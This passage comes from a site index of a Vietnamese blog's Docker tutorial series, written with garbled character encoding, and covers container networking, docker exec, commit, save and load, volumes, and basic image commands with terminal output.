ngÆ°á»£c láº¡i.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 â¯ docker attach B1 / # ping 173.20.0.2 PING 173.20.0.2 (173.20.0.2): 56 data bytes 64 bytes from 173.20.0.2: seq=0 ttl=49 time=325.730 ms 64 bytes from 173.20.0.2: seq=1 ttl=49 time=297.840 ms 64 bytes from 173.20.0.2: seq=2 ttl=49 time=280.704 ms 64 bytes from 173.20.0.2: seq=3 ttl=49 time=328.708 ms 64 bytes from 173.20.0.2: seq=4 ttl=49 time=274.586 ms 64 bytes from 173.20.0.2: seq=5 ttl=49 time=295.232 ms 64 bytes from 173.20.0.2: seq=6 ttl=49 time=274.058 ms ^C --- 173.20.0.2 ping statistics --- 8 packets transmitted, 7 packets received, 12% packet loss round-trip min/avg/max = 274.058/296.694/328.708 ms Má»™t lÆ°u Ã½ lÃ  khi B3 vÃ  B4 cÃ¹ng káº¿t ná»‘i vá»›i nhau qua má»™t máº¡ng, bÃªn cáº¡nh káº¿t ná»‘i vá»›i nhau qua Ä‘á»‹a chá»‰ thÃ¬ chÃºng cÃ³ thá»ƒ káº¿t ná»‘i vá»›i nhau qua tÃªn.\n1 2 3 4 5 6 7 8 9 10 11 â¯ docker attach B3 / # ping B4 PING B4 (172.20.0.3): 56 data bytes 64 bytes from 172.20.0.3: seq=0 ttl=64 time=0.283 ms 64 bytes from 172.20.0.3: seq=1 ttl=64 time=0.194 ms 64 bytes from 172.20.0.3: seq=2 ttl=64 time=0.164 ms 64 bytes from 172.20.0.3: seq=3 ttl=64 time=0.191 ms ^C --- B4 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.164/0.208/0.283 ms Tuy nhiÃªn B1, B2 cÅ©ng káº¿t ná»‘i vá»›i nhau chung 1 máº¡ng mÃ  chÃºng khÃ´ng thá»ƒ giao tiáº¿p vá»›i nhau qua tÃªn. CÃ³ thá»ƒ do máº¡ng cá»§a chÃºng cÃ¹ng káº¿t ná»‘i lÃ  máº¡ng máº·c Ä‘á»‹nh (bridge).\n1 2 3 â¯ docker attach B1 / # ping B2 ping: bad address \u0026#39;B2\u0026#39; XÃ³a máº¡ng Khi khÃ´ng cÃ³ nhu cáº§u sá»­ dá»¥ng network ná»¯a, chÃºng ta cÃ³ thá»ƒ xÃ³a chÃºng Ä‘i vá»›i cÃº phÃ¡p:\ndocker network rm \u0026lt;ten_network\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 â¯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 2f8c72e77060 mynetwork bridge local 258acbefb858 network1 bridge local 271997adaaa9 none null local â¯ docker network rm network1 network1 â¯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 2f8c72e77060 mynetwork bridge local 271997adaaa9 none null local Káº¿t luáº­n Trong bÃ i há»c nÃ y, chÃºng ta Ä‘Ã£ há»c Ä‘Æ°á»£c tá»« anh XuanThuLabChanel nhá»¯ng kiáº¿n thá»©c nhÆ° sau:\nBiáº¿t vá» busybox CÃ¡c lá»‡nh thao tÃ¡c vá»›i docker network: liá»‡t kÃª, kiá»ƒm tra thÃ´ng tin máº¡ng Máº¡ng bridge, táº¡o thÃªm, xÃ³a máº¡ng, Ã¡nh xáº¡ cá»•ng máº¡ng trong docker. Káº¿t thÃºc bÃ i viáº¿t nÃ y, má»™t láº§n ná»¯a em xin chÃ¢n thÃ nh gá»­i lá»i cáº£m Æ¡n Ä‘áº¿n anh XuanThuLabChanel Ä‘Ã£ lÃ m nhá»¯ng bÃ i há»c quÃ½ giÃ¡ vÃ  bá»• Ã­ch nÃ y.\n","description":"Pháº§n nÃ y chÃºng ta sáº½ há»c vá» : Máº¡ng | Networking trong Docker, táº¡o vÃ  quáº£n lÃ½ network trong container Docker ","id":21,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P3)","uri":"https://minhlongmt183.github.io/posts/docker_p3/"},{"content":"\rToÃ n bá»™ series nÃ y Ä‘Æ°á»£c tham kháº£o tá»« hai nguá»“n chÃ­nh: XuanThuLabChanel vÃ  DockerDoc. Em xin chÃ¢n thÃ nh cáº£m Æ¡n sá»± cá»‘ng hiáº¿n cá»§a cÃ¡c tÃ¡c giáº£ cá»§a nhá»¯ng kÃªnh nÃ³i trÃªn.â¤ï¸â¤ï¸â¤ï¸\rLá»‡nh Docker exec, lÆ°u container thÃ nh image vá»›i commit, xuáº¥t image ra file Docker exec ThÃ´ng thÆ°á»ng, Ä‘á»ƒ thá»±c thi má»™t lá»‡nh trong container, ta sáº½ vÃ o container báº±ng lá»‡nh docker attach \u0026lt;container name or id\u0026gt;. Tuy nhiÃªn, náº¿u ta Ä‘ang á»Ÿ host vÃ  váº«n muá»‘n thá»±c thi má»™t lá»‡nh bÃªn trong container Ä‘ang cháº¡y, ta sáº½ dÃ¹ng lá»‡nh docker exec \u0026lt;container id / name\u0026gt; [COMMAND].\nVÃ­ dá»¥, tá»« host, ta cháº¡y lá»‡nh ls Ä‘á»ƒ liá»‡t kÃª táº¥t cáº£ cÃ¡c file trong container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 3 minutes ago Up 3 minutes test â¯ docker exec test ls bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var NgoÃ i ra cÅ©ng váº«n cÃ³ thá»ƒ thÃªm cÃ¡c option, vÃ­ dá»¥:\n1 2 â¯ docker exec -it test bash root@ubuntu1:/# Lá»‡nh trÃªn yÃªu cáº§u thá»±c thi lá»‡nh bash vÃ  thÃªm option -it Ä‘á»ƒ cÃ³ thá»ƒ tÆ°Æ¡ng tÃ¡c trá»±c tiáº¿p vá»›i terminal, dá»… dÃ ng tháº¥y, nÃ³ khÃ¡ giá»‘ng vá»›i lá»‡nh docker attach, tuy nhiÃªn, khi má»Ÿ cÃ¡c process trong container báº±ng htop, chÃºng ta sáº½ tháº¥y nhÆ° sau:\nRÃµ rÃ ng, á»Ÿ Ä‘Ã¢y cÃ³ ngoÃ i process /bin/bash cÃ³ khi táº¡o, container cÃ²n cháº¡y thÃªm má»™t process bash, process nÃ y chÃ­nh lÃ  lá»‡nh mÃ  chÃºng ta yÃªu cáº§u thá»±c thi tá»« mÃ¡y host. Sau khi thá»±c hiá»‡n lá»‡nh docker exec -it test bash, ta gÃµ lá»‡nh exit Ä‘á»ƒ thoÃ¡t khá»i container, tuy nhiÃªn, vÃ¬ container váº«n cÃ²n process /bin/bash nÃªn nÃ³ váº«n cÃ²n hoáº¡t Ä‘á»™ng chá»© khÃ´ng bá»‹ táº¯t Ä‘i.\nDocker commit Sau khi cÃ i docker vÃ  sá»­ dá»¥ng, chÃºng ta cÃ³ thá»ƒ pháº£i cÃ i thÃªm nhiá»u pháº§n má»m, mÃ´i trÆ°á»ng khÃ¡c nhau. Khi Ä‘Ã³, Ä‘á»ƒ chia sáº» container nÃ y Ä‘i, ta cáº§n lÆ°u container nÃ y thÃ nh image. Äá»ƒ lÃ m viá»‡c Ä‘Ã³, ta sá»­ dá»¥ng lá»‡nh container commit.\nTrÆ°á»›c khi lÆ°u container trá»Ÿ thÃ nh image, ta kiá»ƒm tra xem trong há»‡ thá»‘ng cÃ³ nhá»¯ng image nÃ o:\n1 2 3 4 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Má»™t Ä‘iá»u lÆ°u Ã½, muá»‘n lÆ°u container thÃ nh image, thÃ¬ container Ä‘Ã³ pháº£i á»Ÿ tráº¡ng thÃ¡i dá»«ng (Exited).\n1 2 3 4 â¯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 23 minutes ago Exited (0) 4 minutes ago test ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 16 hours ago Exited (0) 16 hours ago centos_docker Tiáº¿n hÃ nh lÆ°u container thÃ nh images, ta dÃ¹ng cÃº phÃ¡p: docker commit CONTAINER image:tag. CONTAINER á»Ÿ Ä‘Ã¢y lÃ  tÃªn hoáº·c id cá»§a container.\nVÃ­ dá»¥, container ubuntu vá»«a rá»“i tÃ´i Ä‘Ã£ cÃ i thÃªm ping vá»›i vim, bÃ¢y giá» lÆ°u láº¡i thÃ nh image, ta thá»±c hiá»‡n:\n1 2 3 4 5 6 7 â¯ docker commit test ubuntu-pv:version1 sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 5 seconds ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB RÃµ rÃ ng, sau khi thá»±c hiá»‡n lá»‡nh trÃªn, chÃºng ta sáº½ tháº¥y trong danh sÃ¡ch cÃ¡c images cÃ³ thá»ƒm má»™t image cÃ³ thÃªn lÃ  ubuntu-py vá»›i TAG lÃ  version1 cÃ¹ng ID vÃ  cÃ¡c thÃ´ng tin khÃ¡c.\nDocker save Sau khi ta lÆ°u container thÃ nh má»™t image, Ä‘á»ƒ cÃ³ thá»ƒ chia sáº» image nÃ y vá»›i ngÆ°á»i khÃ¡c, ta lÆ°u image thÃ nh má»™t file trÃªn mÃ¡y host. Viá»‡c nÃ y sáº½ Ä‘Æ°á»£c thá»±c hiá»‡n thÃ´ng qua lá»‡nh docker save --output filename.tar \u0026lt;image_id/name\u0026gt;.\n1 2 3 4 5 6 7 8 9 10 â¯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 6 minutes ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB â¯ docker save --output ubuntu-pv.tar a8 â¯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar VÃ­ dá»¥ trÃªn tÃ´i Ä‘Ã£ lÆ°u ubuntu-pv image thÃ nh ra file ubuntu-pv.tar.\nDocker load Sau khi nháº­n Ä‘Æ°á»£c file image.tar, Ä‘á»ƒ phá»¥c há»“i hoáº·c sá»­ dá»¥ng láº¡i, ta sá»­ dá»¥ng lá»‡nh docker load -i image.tar\nVÃ­ dá»¥, tÃ´i tiáº¿n hÃ nh xÃ³a Ä‘i ubuntu-pv image hiá»‡n cÃ³ trÃªn há»‡ thá»‘ng. Lá»‡nh thao tÃ¡c vá»›i image báº¡n cÃ³ thá»ƒ xem á»Ÿ P1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 11 minutes ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB â¯ docker image rm -f ubuntu-pv:version1 Untagged: ubuntu-pv:version1 Deleted: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a â¯ docker image rm ubuntu:latest Untagged: ubuntu:latest Untagged: ubuntu@sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Deleted: sha256:7e0aa2d69a153215c790488ed1fcec162015e973e49962d438e18249d16fa9bd â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE centos latest 300e315adb2f 6 months ago 209MB BÃ¢y giá», ta tiáº¿n hÃ nh phá»¥c há»“i ubuntu-pv image tá»« file ubuntu-pv.tar Ä‘Ã£ cÃ³ á»Ÿ trÆ°á»›c Ä‘Ã³.\n1 2 3 4 5 6 7 8 â¯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar â¯ docker load -i ubuntu-pv.tar Loaded image ID: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; a8e04dcf8737 14 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB Khi phá»¥c há»“i, tÃªn cá»§a image vÃ  tag cá»§a nÃ³ sáº½ lÃ  \u0026lt;none\u0026gt;. Äá»ƒ Ä‘áº·t tÃªn vÃ  tag, ta dÃ¹ng lá»‡nh:\ndocker tag image_id name:tag.\nâ¯ docker tag a8 newimage:version2\râ¯ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 16 minutes ago 170MB\rcentos latest 300e315adb2f 6 months ago 209MB Chia sáº» dá»¯ liá»‡u trong Docker, táº¡o vÃ  quáº£n lÃ½ á»• Ä‘Ä©a docker volume Chia sáº» dá»¯ liá»‡u giá»¯a mÃ¡y host vÃ  container TrÃªn mÃ¡y host, tÃ´i tá»• chá»©c cÃ¢y thá»±c má»¥c nhÆ° sau:\n1 2 3 4 . â”œâ”€â”€ docker â”‚Â â””â”€â”€ data â”‚Â â””â”€â”€ d.txt Má»¥c tiÃªu cá»§a chÃºng ta lÃ  Ä‘á»ƒ container cÃ³ thá»ƒ truy cáº­p vÃ  thao tÃ¡c vá»›i dá»¯ liá»‡u á»Ÿ trong data, vÃ  khi container bá»‹ xÃ³a Ä‘i, dá»¯ liá»‡u khÃ´ng bá»‹ máº¥t.\nChÃºng ta táº¡o má»›i má»™t container vÃ  trong lÃºc táº¡o sáº½ chá»‰ rÃµ thá»±c má»¥c Ã¡nh xáº¡ trÃªn host vÃ  thá»±c má»¥c Ä‘Æ°á»£c Ã¡nh xáº¡ á»Ÿ Ä‘Ã¢u trÃªn container.\ndocker run -it -v \u0026lt;thu/muc/tren/host\u0026gt;:\u0026lt;thu/muc/anh/xa/tren/container\u0026gt; \u0026lt;image id\u0026gt;\n1 2 3 4 5 6 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 28 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB â¯ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data a8 root@d4d24f24bbe6:/# ChÃºng ta tiáº¿n hÃ nh kiá»ƒm tra:\n1 2 3 4 root@d4d24f24bbe6:/# cd /home/shared_data/ root@d4d24f24bbe6:/home/shared_data# ls d.txt root@d4d24f24bbe6:/home/shared_data# NhÆ° váº­y, dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c Ã¡nh xáº¡ vÃ  má»i thao tÃ¡c trÃªn dá»¯ liá»‡u á»Ÿ thÆ° má»¥c nÃ y sáº½ Ä‘Æ°á»£c lÆ°u vÃ o host.\nChia sáº» dá»¯ liá»‡u giá»¯a cÃ¡c container vá»›i nhau ChÃºng ta táº¡o láº¡i má»™t container cÃ³ tÃªn lÃ  container1 Ã¡nh xáº¡ tá»›i dá»¯ liá»‡u Desktop/docker/data, vÃ  táº¡o má»™t container2 muá»‘n Ã¡nh xáº¡ tá»›i dá»± liá»‡u nÃ y, thay vÃ¬ dÃ¹ng lá»‡nh táº¡o nhÆ° container1, ta cÃ³ thá»ƒ dÃ¹ng --volumes-from \u0026lt;container_name/id\u0026gt;\n1 2 3 4 5 6 7 8 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 36 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB â¯ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data --name \u0026#34;container1\u0026#34; a8 root@b62e5d395369:/# % â¯ docker run -it --name container2 --volumes-from container1 centos [root@e1103acb0525 /]# Chia sáº» qua volume BÃªn cáº¡nh viá»‡c chia sáº» dá»¯ liá»‡u báº±ng cÃ¡ch táº¡o cÃ¡c file dá»¯ liá»‡u, docker cÃ²n cho phÃ©p chÃºng ta táº¡o ra nhá»¯ng á»• Ä‘Ä©a, gÃ¡n vÃ o container vÃ  Ä‘á»ƒ chia sáº» dá»¯ liá»‡u giá»¯a chÃºng. CÅ©ng nhÆ° file, khi container xÃ³a thÃ¬ nhá»¯ng á»• Ä‘Ä©a nÃ y váº«n cÃ²n tá»“n táº¡i cho Ä‘áº¿n khi chÃºng ta cá»‘ tÃ¬nh xÃ³a nÃ³.\nKiá»ƒm tra cÃ¡c á»• Ä‘Ä©a hiá»‡n cÃ³ Äá»ƒ kiá»ƒm tra cÃ¡c á»• Ä‘Ä©a hiá»‡n cÃ³, ta dÃ¹ng lá»‡nh:\n1 2 â¯ docker volume ls DRIVER VOLUME NAME Hiá»‡n táº¡i trÃªn há»‡ thá»‘ng khÃ´ng cÃ³ á»• Ä‘Ä©a nÃ o.\nTáº¡o á»• Ä‘Ä©a Äá»ƒ táº¡o má»™t á»• Ä‘Ä©a má»›i, ta dÃ¹ng lá»‡nh: docker volume create NAMEDISK.\n1 2 3 4 5 â¯ docker volume create D1 D1 â¯ docker volume ls DRIVER VOLUME NAME local D1 Kiá»ƒm tra thÃ´ng tin á»• Ä‘Ä©a Äá»ƒ kiá»ƒm tra thÃ´ng tin á»• Ä‘Ä©a ta dÃ¹ng lá»‡nh docker volume inspect NAMEDISK.\n1 2 3 4 5 6 7 8 9 10 11 12 â¯ docker volume inspect D1 [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:06:13+07:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/D1/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;D1\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] XÃ³a á»• Ä‘Ä©a Khi khÃ´ng cÃ³ nhu cáº§u sá»­ dá»¥ng, ta sá»­ dá»¥ng lá»‡nh docker volume rm NAMEDISK.\n1 2 3 4 5 6 7 8 9 â¯ docker volume ls DRIVER VOLUME NAME local D1 local D2 â¯ docker volume rm D1 D1 â¯ docker volume ls DRIVER VOLUME NAME local D2 GÃ¡n á»• Ä‘Ä©a volume vÃ o container Ta sá»­ dá»¥ng cÃº phÃ¡p:\ndocker run -it --mount source=DISK,target=pathContainer imageID\n1 2 3 4 5 6 7 8 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB â¯ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest root@524a1182f690:/# cd /home/disk2/ root@524a1182f690:/home/disk2# Ta tiáº¿n hÃ nh thÃªm dá»¯ liá»‡u trong thÆ° má»¥c trÃªn, sau Ä‘Ã³ xÃ³a container Ä‘i, vÃ  tháº¥y, á»• Ä‘Ä©a váº«n cÃ²n.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB â¯ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest root@524a1182f690:/# cd /home/disk2/ root@524a1182f690:/home/disk2# â¯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 524a1182f690 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About a minute ago Exited (0) 23 seconds ago cocky_mclaren e1103acb0525 centos \u0026#34;/bin/bash\u0026#34; 19 minutes ago Exited (127) 11 minutes ago container2 b62e5d395369 a8 \u0026#34;/bin/bash\u0026#34; 21 minutes ago Exited (0) 11 minutes ago container1 â¯ docker rm 52 52 â¯ docker volume ls DRIVER VOLUME NAME local D2 Váº­y lÃ m sao Ä‘á»ƒ truy xuáº¥t dá»¯ liá»‡u hiá»‡n cÃ³ trÃªn D2 hoáº·c kiá»ƒm tra xem cÃ³ dá»¯ liá»‡u trÃªn Ä‘Ã³ hay khÃ´ng? Äá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³, chÃºng ta táº¡o má»™t container khÃ¡c, mount tá»›i D2 vÃ  kiá»ƒm tra.\n1 2 3 4 5 â¯ docker run -it --mount source=D2,target=/home/disk3 ubuntu:latest root@ca47e1855144:/# cd /home/disk3/ root@ca47e1855144:/home/disk3# ls data.txt root@ca47e1855144:/home/disk3# Dá»¯ liá»‡u do container trÆ°á»›c Ä‘Ã£ táº¡o vÃ  lÆ°u vÃ o, dá»¯ liá»‡u nÃ y váº«n cÃ²n máº·c dÃ¹ container Ä‘Ã£ xÃ³a Ä‘i.\nTáº¡o á»• Ä‘Ä©a Ã¡nh xáº¡ tá»›i thÆ° má»¥c trÃªn mÃ¡y host. CÃº phÃ¡p:\ndocker create --opt device =pathHOST --opt type=noe --opt o=bind DISKNAME\n1 2 3 4 5 6 â¯ docker volume create --opt device=/home/edisc/Desktop/docker/data --opt type=none --opt o=bind DISK1 DISK1 â¯ docker volume ls DRIVER VOLUME NAME local D2 local DISK1 ThÃ´ng tin á»• Ä‘Ä©a cÃ³ Ä‘Æ°á»£c nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 â¯ docker volume inspect DISK1 [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:27:56+07:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/DISK1/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;DISK1\u0026#34;, \u0026#34;Options\u0026#34;: { \u0026#34;device\u0026#34;: \u0026#34;/home/edisc/Desktop/docker/data\u0026#34;, \u0026#34;o\u0026#34;: \u0026#34;bind\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;none\u0026#34; }, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] Äá»ƒ cháº¡y container vá»›i tham sá»‘ nÃ y ta khÃ´ng sá»­ dá»¥ng tÃ¹y chá»n --mount mÃ  ta sáº½ sá»§ dá»¥ng tÃ¹y chá»n -v.\n1 2 3 4 5 6 7 8 9 10 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB â¯ docker run -it -v DISK1:/home/disk4 ubuntu:latest root@e94027a36d5b:/# cd /home/disk4/ root@e94027a36d5b:/home/disk4# ls c1.txt d.txt data_container2.txt root@e94027a36d5b:/home/disk4# VÃ o thÆ° má»¥c vÃ  kiá»ƒm tra, ta váº«n tháº¥y nÃ³ cÃ³ cÃ¡c dá»¯ liá»‡u á»Ÿ trÃªn mÃ¡y host. VÃ  khi thao tÃ¡c dá»¯ liá»‡u trÃªn nÃ y, dá»¯ liá»‡u trÃªn mÃ¡y host cÅ©ng sáº½ Ä‘Æ°á»£c cáº­p nhÃ¢t.\nKáº¿t luáº­n Trong bÃ i há»c nÃ y, chÃºng ta Ä‘Ã£ há»c Ä‘Æ°á»£c tá»« anh XuanThuLabChanel nhá»¯ng kiáº¿n thá»©c nhÆ° sau: CÃ¡c lá»‡nh Docker exec, lÆ°u container thÃ nh image vá»›i commit, xuáº¥t image ra file:\ndocker exec: thá»±c thi má»™t lá»‡nh bÃªn trong container Ä‘ang cháº¡y tá»« host. docker commit: lÆ°u container thÃ nh image docker save: lÆ°u image thÃ nh file. docker load: chuyá»ƒn file thÃ nh image.\nChia sáº» dá»¯ liá»‡u trong Docker, táº¡o vÃ  quáº£n lÃ½ á»• Ä‘Ä©a docker volume: Chia sáº» dá»¯ liá»‡u qua tá»‡p: Container vá»›i host Giá»¯a container vá»›i nhau. Chia sáº» dá»¯ liá»‡u qua á»• Ä‘Ä©a disk: cÃ¡c thao tÃ¡c vá»›i volume thÃ´ng qua lá»‡nh docker volume kÃ¨m cÃ¡c option tÆ°Æ¡ng á»©ng.\nKáº¿t thÃºc bÃ i viáº¿t nÃ y, má»™t láº§n ná»¯a em xin chÃ¢n thÃ nh gá»­i lá»i cáº£m Æ¡n Ä‘áº¿n anh XuanThuLabChanel Ä‘Ã£ lÃ m nhá»¯ng bÃ i há»c quÃ½ giÃ¡ vÃ  bá»• Ã­ch nÃ y. ","description":"Pháº§n nÃ y chÃºng ta sáº½ tÃ¬m hiá»ƒu lá»‡nh Docker exec, lÆ°u container thÃ nh image vá»›i commit, xuáº¥t image ra file; Chia sáº» dá»¯ liá»‡u trong Docker, táº¡o vÃ  quáº£n lÃ½ á»• Ä‘Ä©a docker volume ","id":22,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P2)","uri":"https://minhlongmt183.github.io/posts/docker_p2/"},{"content":"\rToÃ n bá»™ series nÃ y Ä‘Æ°á»£c tham kháº£o tá»« hai nguá»“n chÃ­nh: XuanThuLabChanel vÃ  DockerDoc. Em xin chÃ¢n thÃ nh cáº£m Æ¡n sá»± cá»‘ng hiáº¿n cá»§a cÃ¡c tÃ¡c giáº£ cá»§a nhá»¯ng kÃªnh nÃ³i trÃªn.â¤ï¸â¤ï¸â¤ï¸\rLÃ m quen vá»›i docker command line Khi lÃ m viá»‡c vá»›i docker, lá»‡nh chÃºng ta hay dÃ¹ng Ä‘Ã³ chÃ­nh lÃ  docker. Sau lá»‡nh docker sáº½ cÃ³ nhiá»u lá»‡nh nhá», Ä‘á»ƒ xem danh sÃ¡ch cÃ¡c lá»‡nh nhá» nÃ y, ta gÃµ\n1 $ docker 1 $ docker run -d -p 80:80 docker/getting-started Trong Ä‘Ã³:\n-d: cháº¡y container á»Ÿ cháº¿ Ä‘á»™ detached mode (á»Ÿ background) -p 80:80: Ã¡nh xáº¡ cá»•ng 80 cá»§a host vÃ o cá»•ng 80 cá»§a container. docker/getting-started: image sá»­ dá»¥ng Docker images Liá»‡t kÃª cÃ¡c images 1 2 3 4 5 6 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB á» Ä‘Ã¢y,\nREPOSITORY lÃ  tÃªn cá»§a image, TAG lÃ  phiÃªn báº£n cá»§a image, IMAGE ID lÃ  má»™t mÃ£ hash cá»§a image, CREATED lÃ  thá»i gian Ä‘Æ°á»£c táº¡o cá»§a image, SIZE lÃ  kÃ­ch thÆ°á»›c cá»§a image.\nCÃ¡c images nÃ y láº¥y tá»« hub.docker.com. ChÃºng ta vÃ o hub.docker.com Ä‘á»ƒ tÃ¬m kiáº¿m image thÃ­ch há»£p mÃ  mÃ¬nh muá»‘n táº£i. LÆ°u Ã½ náº¿u láº§n Ä‘áº§u báº¡n vÃ o trang nÃ y, báº¡n cáº§n Ä‘Äƒng kÃ­ má»™t tÃ i khoáº£n. NgoÃ i ra, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m trá»±c tiáº¿p trÃªn terminal vá»›i lá»‡nh: 1 docker search \u0026lt;keyword\u0026gt; VÃ­ dá»¥, ta muá»‘n tÃ¬m kiáº¿m cÃ¡c images cá»§a ubuntu\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 â¯ docker search ubuntu NAME DESCRIPTION STARS OFFICIAL AUTOMATED ubuntu Ubuntu is a Debian-based Linux operating sysâ€¦ 12337 [OK] dorowu/ubuntu-desktop-lxde-vnc Docker image to provide HTML5 VNC interface â€¦ 539 [OK] websphere-liberty WebSphere Liberty multi-architecture images â€¦ 273 [OK] rastasheep/ubuntu-sshd Dockerized SSH service, built on top of offiâ€¦ 253 [OK] consol/ubuntu-xfce-vnc Ubuntu container with \u0026#34;headless\u0026#34; VNC sessionâ€¦ 241 [OK] ubuntu-upstart Upstart is an event-based replacement for thâ€¦ 110 [OK] 1and1internet/ubuntu-16-nginx-php-phpmyadmin-mysql-5 ubuntu-16-nginx-php-phpmyadmin-mysql-5 50 [OK] open-liberty Open Liberty multi-architecture images basedâ€¦ 46 [OK] ubuntu-debootstrap debootstrap --variant=minbase --components=mâ€¦ 44 [OK] i386/ubuntu Ubuntu is a Debian-based Linux operating sysâ€¦ 25 nuagebec/ubuntu Simple always updated Ubuntu docker images wâ€¦ 24 [OK] solita/ubuntu-systemd Ubuntu + systemd 24 [OK] 1and1internet/ubuntu-16-apache-php-5.6 ubuntu-16-apache-php-5.6 14 [OK] 1and1internet/ubuntu-16-apache-php-7.0 ubuntu-16-apache-php-7.0 13 [OK] 1and1internet/ubuntu-16-nginx-php-phpmyadmin-mariadb-10 ubuntu-16-nginx-php-phpmyadmin-mariadb-10 11 [OK] 1and1internet/ubuntu-16-nginx-php-5.6-wordpress-4 ubuntu-16-nginx-php-5.6-wordpress-4 9 [OK] 1and1internet/ubuntu-16-nginx-php-5.6 ubuntu-16-nginx-php-5.6 8 [OK] 1and1internet/ubuntu-16-apache-php-7.1 